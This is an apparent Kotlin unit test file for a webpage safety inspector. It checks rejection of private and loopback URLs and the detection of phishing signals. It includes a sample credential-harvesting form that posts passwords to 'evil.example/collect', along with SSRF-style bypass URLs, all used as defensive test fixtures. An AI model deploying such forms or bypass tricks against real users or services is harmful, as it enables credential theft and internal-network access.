package com.ghostforge.app

import java.net.InetAddress
import org.junit.Assert.*
import org.junit.Test

class WebpageInspectorTest {
    @Test fun rejectsPrivateAndRawIpUrls() {
        val urls = listOf(
            "http://example.com", "https://127.0.0.1",
            "https://192.168.1.1/admin", "https://example.com:8443/",
            "https://localhost/", "https://intranet.local/",
            "https://example.com@127.0.0.1/", "https://example.com/#secret"
        )
        urls.forEach { value ->
            try { WebpageInspector.validatedUrl(value); fail("Accepted: " + value) }
            catch (_: IllegalArgumentException) { }
            catch (_: IllegalStateException) { }
        }
    }

    @Test fun refusesPrivateOrSpecialIps() {
        for (ip in listOf("10.1.1.1","192.168.0.5","100.64.0.2","169.254.9.8",
            "127.0.0.1","198.18.0.1","203.0.113.5","::1","fc00::1","fe80::1")) {
            assertFalse(ip, WebpageInspector.isPublicAddress(InetAddress.getByName(ip)))
        }
        assertTrue(WebpageInspector.isPublicAddress(InetAddress.getByName("1.1.1.1")))
        assertTrue(WebpageInspector.isPublicAddress(InetAddress.getByName("2606:4700:4700::1111")))
    }

    @Test fun highlightsCredentialFormsAndExternalSubmitHost() {
        val report = WebpageInspector.analyzeHtml(
            "https://bank.example/login", """
            <html><head><title>Verify your account urgently</title></head>
            <body>
            <form action="https://evil.example/collect">
              <input type="password" name="password"/>
              <button>Submit</button>
            </form>
            <a href="https://evil.example/">https://bank.example/home</a>
            </body></html>
            """.trimIndent()
        )
        assertEquals("warning_signs", report.verdict)
        assertTrue(report.signals.any { it.contains("password") })
        assertTrue(report.signals.any { it.contains("another hostname") })
        assertTrue(report.signals.any { it.contains("different hostnames") })
    }

    @Test fun doesNotCallNormalPageSafe() {
        val report = WebpageInspector.analyzeHtml(
            "https://example.com/", "<html><title>Example</title><body>Hello</body></html>")
        assertEquals("unverified", report.verdict)
        assertTrue(report.notice.contains("No findings does not mean safe"))
    }

    @Test fun detectsRefreshHeader() {
        val report = WebpageInspector.analyzeHtml(
            "https://example.com/", """
                <html><head><meta http-equiv="refresh" content="0; url=https://other.example"/></head></html>
            """.trimIndent())
        assertTrue(report.signals.any { it.contains("automatic refresh") })
    }
}
